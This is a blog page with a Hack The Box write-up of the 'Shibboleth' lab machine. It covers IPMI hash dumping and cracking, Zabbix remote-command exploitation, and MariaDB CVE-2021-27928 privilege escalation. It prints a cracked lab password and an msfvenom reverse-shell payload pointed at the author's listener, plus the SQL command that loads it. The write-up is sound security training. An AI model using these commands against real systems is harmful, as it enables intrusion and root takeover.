@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Shibboleth Hackthebox writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  <link href="//www.google-analytics.com" rel="dns-prefetch">
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Shibboleth Hackthebox writeup">
+    <meta name="twitter:description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version
+">
+    <meta name="twitter:image" content="/media/shibboleth/20220401204521.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Shibboleth Hackthebox writeup">
+  <meta property="og:description" content="In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version
+">
+  <meta property="og:url" content="/post/shibboleth/">
+  <meta property="og:image" content="/media/shibboleth/20220401204521.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/shibboleth/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/grey-prism.svg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle"></p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/">Posts</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Shibboleth Hackthebox writeup</h1>
+      <p class="post-meta">@0xMesbaha · Apr 1, 2022 · 4 min read</p>
+    </header>
+    <article class="post-content"><p>In this Box we are going to enumerate a udp port and dump the administrator hash ,then we will crack it , using these credentials we will login to the zabbix web interface , using my exploit for this version of zabbix we will get a low-privilege shell. re-using same password will leverage our access to a user. for the root part we will exploit a vulnerable maria-db version</p>
+<h1 id="scanning-">Scanning :</h1>
+<p>basic scanning :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T4 10.10.11.124 
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+Service Info: Host: shibboleth.htb
+</code></pre></div><p>it was suspicious to have only this port , so i performed a udp scan as well :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sU 10.10.11.124
+
+PORT    STATE SERVICE
+623/udp open  asf-rmcp
+</code></pre></div><p>we can add <code>shibboleth.htb</code> to the <code>/etc/hosts</code> and move on to enumeration</p>
+<h1 id="enumeration-">Enumeration :</h1>
+<p>we can start performing some vhost enumeration :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb -H <span style="color:#e6db74">&#34;Host: FUZZ.shibboleth.htb&#34;</span>  -fc <span style="color:#ae81ff">302</span>
+
+monitor                 <span style="color:#f92672">[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span style="color:#f92672">]</span>
+monitoring              <span style="color:#f92672">[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span style="color:#f92672">]</span>
+zabbix                  <span style="color:#f92672">[</span>Status: 200, Size: 3686, Words: 192, Lines: 30<span style="color:#f92672">]</span>
+</code></pre></div><p>and add them to the <code>/etc/hosts</code> as well</p>
+<pre><code>10.10.11.124	shibboleth.htb	monitor.shibboleth.htb	zabbix.shibboleth.htb
+</code></pre><p>the UDP port we have found eariler seems worthy to search for , and you can find <a href="https://book.hacktricks.xyz/pentesting/623-udp-ipmi">this</a> post from Hacktricks</p>
+<p>we can use that to find the version first</p>
+<p><img src="/media/shibboleth/20220401205846.png" alt="error">
+then we can try that :</p>
+<p><img src="/media/shibboleth/20220401205951.png" alt="error"></p>
+<p>seems to be <code>IPMI-2.0 UserAuth </code> , from the same post we can see :</p>
+<p><img src="/media/shibboleth/20220401210253.png" alt="error"></p>
+<p>we can try that :</p>
+<p><img src="/media/shibboleth/20220401210325.png" alt="error"></p>
+<p>and it retrieves a hash , we can see if we can crack it.</p>
+<p>from hashcat wiki <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a></p>
+<p><img src="/media/shibboleth/20220401210453.png" alt="error"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">7300</span> hash2 /usr/share/wordlists/rockyou.txt
+</code></pre></div><p><img src="/media/shibboleth/20220401210621.png" alt="error"></p>
+<p>so now we have these credentials <code>Administrator:ilovepumkinpie1</code></p>
+<p>after this point i performed some enumeration to the <code>IPMI</code> like :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ipmitool -I lanplus -C <span style="color:#ae81ff">0</span> -H 10.10.11.124 -U Administrator -P ilovepumkinpie1  user list
+</code></pre></div><p>and other But seems i went so far from the foothold :(</p>
+<p>now we can take a look at the <code>TCP port 80</code> we have found earlier</p>
+<p><strong><code>shibboleth.htb</code></strong>  is not interesting at all , all pages are static</p>
+<p><img src="/media/shibboleth/20220401211105.png" alt="error"></p>
+<p><strong><code>zabbix.shibboleth.htb</code></strong> has login page so obviously i tried the credentials we have</p>
+<p><img src="/media/shibboleth/20220401211214.png" alt="error"></p>
+<p>and we are in :</p>
+<p><img src="/media/shibboleth/20220401211319.png" alt="error"></p>
+<h1 id="foothold">Foothold:</h1>
+<p>if you look at the footer you will find the zabbix version:</p>
+<p><img src="/media/shibboleth/20220401211354.png" alt="error"></p>
+<p>searching for it i found no exploits , you can start doing your research and will find at the documentation <a href="https://www.zabbix.com/documentation/5.4/en/manual/config/notifications/action/operation/remote_command">here</a> the web interface can execute remote commands</p>
+<p>actually to exploit it you will do a lot of searching in different options at the web page until you find the page.</p>
+<p>at this time i was practicing python so why not to write my first published exploit ?</p>
+<p><img src="https://media.giphy.com/media/3MkhtxEKImJL3HbRzE/giphy.gif" alt=""></p>
+<p>you will find it <a href="https://www.exploit-db.com/exploits/50816">here</a></p>
+<p><img src="/media/shibboleth/20220401212257.png" alt="error"></p>
+<p>so let&rsquo;s download it and try using the exploit</p>
+<p><img src="/media/shibboleth/20220401212449.png" alt="error"></p>
+<p>and after one minute:</p>
+<p><img src="/media/shibboleth/20220401212602.png" alt="error"></p>
+<h1 id="privilege-escalation">Privilege escalation:</h1>
+<p>only one user exist which is <code>ipmi_svc</code> , and we have the password from the <code>ipmi</code> right , worthy trying it :</p>
+<p><img src="/media/shibboleth/20220401212805.png" alt="error"></p>
+<p>and it works</p>
+<h1 id="root-access">Root Access</h1>
+<p>Uploading Linpeas to the Box and start investigating the output :</p>
+<p><img src="/media/shibboleth/20220401213204.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401213240.png" alt="error"></p>
+<p><img src="/media/shibboleth/20220401213444.png" alt="error"></p>
+<p>and as we can see Maria DB is running locally only , and we can see <a href="https://github.com/carlospolop/PEASS-ng/releases/download/20220401/linpeas.sh">linpeas</a> found the username and the password to connect to the database, we can try interact with it</p>
+<p>we can read the file except the comments , hence it won&rsquo;t be applicable</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/zabbix/zabbix_server.conf | grep -v <span style="color:#e6db74">&#34;#&#34;</span> 
+</code></pre></div><p><img src="/media/shibboleth/20220401214523.png" alt="error"></p>
+<p>now let&rsquo;s try interact with it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#75715e"># password :bloooarskybluh</span>
+ mysql -u zabbix -D zabbix -p 
+</code></pre></div><p>and we are in :</p>
+<p><img src="/media/shibboleth/20220401214650.png" alt="error"></p>
+<p>this Maria-DB version we see at the banner is Vulnerable to <strong><code>OS command injection</code></strong> , and we can find the exploit <a href="https://github.com/Al1ex/CVE-2021-27928">here</a></p>
+<p>following the steps:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.16.52 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f elf-so -o CVE-2021-27928.so
+</code></pre></div><p>set the listener and move the <code>.so</code> file to the Box. then on the box login to the database then :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">MariaDB <span style="color:#f92672">[</span>zabbix<span style="color:#f92672">]</span>&gt; SET GLOBAL wsrep_provider<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/dev/shm/CVE-2021-27928.so&#34;</span>;
+</code></pre></div><p><img src="/media/shibboleth/20220401215308.png" alt="error"></p></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+        
+          <li><a href="/tags/ipmi"><span class="tag">Ipmi</span></a></li>
+        
+          <li><a href="/tags/maria-db"><span class="tag">Maria-DB</span></a></li>
+        
+          <li><a href="/tags/zabbix"><span class="tag">Zabbix</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+  </body>
+</html>
